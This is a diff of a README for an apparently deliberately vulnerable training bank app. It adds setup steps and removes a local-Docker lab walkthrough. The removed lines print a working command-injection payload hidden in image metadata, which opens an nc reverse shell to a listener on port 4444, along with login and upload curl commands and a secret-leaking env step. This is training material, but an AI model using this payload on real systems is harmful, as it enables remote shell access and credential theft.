@@ -23,6 +23,30 @@ This application demonstrates various popular security flaws based on the **OWAS
 
 ---
 
+## 📥 Getting Started (Download & Install)
+
+### Prerequisites
+Install these first:
+* **Git** — to download the lab: <https://git-scm.com/downloads>
+* **Docker Desktop** (recommended) — runs the **full** lab, including the RCE/reverse shell:
+  <https://www.docker.com/products/docker-desktop/> (make sure it is running before you start)
+* *(Optional)* **Node.js 20+** — only if you prefer running without Docker: <https://nodejs.org/>
+* *(Optional, for the attack labs)* **curl**, **jq**, **ExifTool**, and **Nmap/Ncat** on your host.
+
+### 1. Download the lab
+Clone the repository and enter the project folder:
+```bash
+git clone https://github.com/dodiventuraz/vuln_geeks_bank.git
+cd vuln_geeks_bank
+```
+> Prefer not to use Git? On GitHub click **Code → Download ZIP**, extract it, then `cd` into the
+> extracted folder.
+
+### 2. Start the lab
+Continue with **Method 1 (Docker)** below (recommended) or **Method 2 (Node.js)**.
+
+---
+
 ## 🐳 Running the Application
 
 The application is configured to run on port **`3000`** by default to prevent conflicts with proxy testing tools like **Burp Suite** (which typically use port `8080`).
@@ -60,7 +84,8 @@ Access the application via your browser at: **`http://localhost:3000`**
 
 > Note: on a bare Node.js host without **ImageMagick** installed, the avatar-upload RCE (#16)
 > still executes injected commands, but the thumbnail step degrades gracefully. For the full lab
-> experience (and the reverse shell walkthrough below), use **Method 1 (Docker)**.
+> experience (including the reverse shell walkthrough in **`vulnerability_list.md`**), use
+> **Method 1 (Docker)**.
 
 ### Verifying the vulnerabilities
 With the lab running, you can auto-check the deliberate flaws from the host:
@@ -80,50 +105,8 @@ This application contains various security flaws that are documented in detail i
 * Authentication bypass using the JWT `none` algorithm.
 * **OS Command Injection → Remote Code Execution (RCE)** via the avatar upload (image comment metadata).
 
----
-
-## 🧪 Lab Walkthrough: RCE Reverse Shell (Local Docker)
-
-This walkthrough demonstrates escalating the avatar-upload command injection (Vulnerability #16)
-into an interactive **reverse shell**, running entirely on your machine. Full payload variants and
-remediation notes are in **`vulnerability_list.md`**.
-
-**Setup:** the target runs inside the `vuln-geeks-bank` container (Method 1 above); the attacker
-tools run on your host. From inside the container, your host is reachable as
-**`host.docker.internal`** — use that as the callback address.
-
-**1. Start a listener on the host** (use `ncat` from Nmap, or `nc` in WSL/Git Bash):
-```bash
-ncat -lvnp 4444
-```
-
-**2. Craft a malicious image** — embed the payload in a real image's JPEG comment metadata
-(`ATTACKER_IP` → `host.docker.internal`):
-```bash
-exiftool -Comment='"; rm -f /tmp/f; mkfifo /tmp/f; (cat /tmp/f | /bin/sh -i 2>&1 | nc host.docker.internal 4444 > /tmp/f) & echo "' avatar.jpg
-```
-
-**3. Get a token and upload** (the front-end filter is client-side only, so send it directly):
-```bash
-TOKEN=$(curl -s http://localhost:3000/api/auth/login -H 'Content-Type: application/json' \
-  -d '{"email":"rangga@geekswarrior.id","password":"hunter2"}' | jq -r .token)
-
-curl -s -X POST http://localhost:3000/api/upload -H "Authorization: Bearer $TOKEN" \
-  -F 'avatar=@avatar.jpg;type=image/jpeg'
-```
-
-**4. Catch the shell** — an interactive `/bin/sh` connects back to your listener as the Node process
-user. Try `id`, `cat /app/server.js`, or `env` (leaks `JWT_SECRET`).
-
-**Warm-up check (no listener needed)** — prove code execution via the reflected output field:
-```bash
-exiftool -Comment='"; id; uname -a; echo "' avatar.jpg
-curl -s -X POST http://localhost:3000/api/upload -H "Authorization: Bearer $TOKEN" \
-  -F 'avatar=@avatar.jpg;type=image/jpeg' | jq -r .processingLog
-```
-
-> The reverse-shell payload is detached (`& ...`) so it survives the 10-second `child_process.exec`
-> timeout. Without detaching, the shell would drop after ~10 seconds.
+A full **RCE reverse-shell lab walkthrough** (including the local-Docker quick start) is provided in
+**`vulnerability_list.md`** under *"Lab Exercise: Reverse Shell via Avatar Upload"*.
 
 ---
 
